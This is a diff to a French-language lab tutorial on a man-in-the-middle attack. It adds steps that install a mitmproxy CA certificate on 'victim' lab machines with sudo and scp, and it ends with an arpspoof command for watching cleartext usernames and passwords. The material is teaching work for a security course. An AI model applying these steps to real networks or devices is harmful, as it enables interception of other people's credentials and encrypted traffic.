@@ -210,6 +210,8 @@ Je vous propose un tutoriel détaillé pour configurer et exécuter une attaque 
 - Cherchez le POST
 - Observez le username et le password en texte claire
 
+## ==> Nous allons refaire les mêmes manipulations sur les machines victimes
+
 # IMPORTANT 2:
 - Essayez de refaire les mêmes manipulations sur une machine victime.
 - *Résultat :* ça ne fonctionne pas !
@@ -223,7 +225,25 @@ Je vous propose un tutoriel détaillé pour configurer et exécuter une attaque 
 - Observez le username et le password en texte claire (*MACHINE ATTAQUANT - http://localhost:8081*)
 
 # IMPORTANT 3:
-- Téléchargez 
+- Téléchargez le certificat en cliquant sur le bouton vert Get mitmproxy-ca-cert  (*MACHINE ATTAQUANT*)
+- cd Downloads  (*MACHINE ATTAQUANT*)
+- sudo cp mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/mitmproxy-ca-cert.crt  (*MACHINE ATTAQUANT*)
+- sudo update-ca-certificates  (*MACHINE ATTAQUANT*)
+- cat mitmproxy-ca-cert.pem et copier (*MACHINE ATTAQUANT*)
+- cd Downloads (*MACHINE VICTIME 1 ou 2 *)
+- nano mitmproxy-ca-cert.pem et coller (*MACHINE VICTIME*)
+- sudo cp mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/mitmproxy-ca-cert.crt (*MACHINE VICTIME*)
+- sudo update-ca-certificates  (*MACHINE VICTIME*)
+## Autre méthode 
+- scp mitmproxy-ca-cert.pem eleve@10.0.2.20:\tmp
+- scp mitmproxy-ca-cert.pem eleve@10.0.2.30:\tmp
+## Ensuite: 
+- scp mitmproxy-ca-cert.pem eleve@10.0.2.20:\tmp
+- cd /tmp
+- sudo cp mitmproxy-ca-cert.pem /usr/local/share/ca-certificates/mitmproxy-ca-cert.crt
+  
+![image](https://github.com/hrhouma/securite-logiciels-applications/assets/10111526/136346cb-7350-4d82-a459-6ee2ee0a2f23)
+
 # Pour résumer : 
 ## Installer terminator dans la machine de l'attaquant et diviser en 4
 - terminal 1 :  sudo arpspoof -i enp0s8 -t 10.0.2.20 10.0.2.30
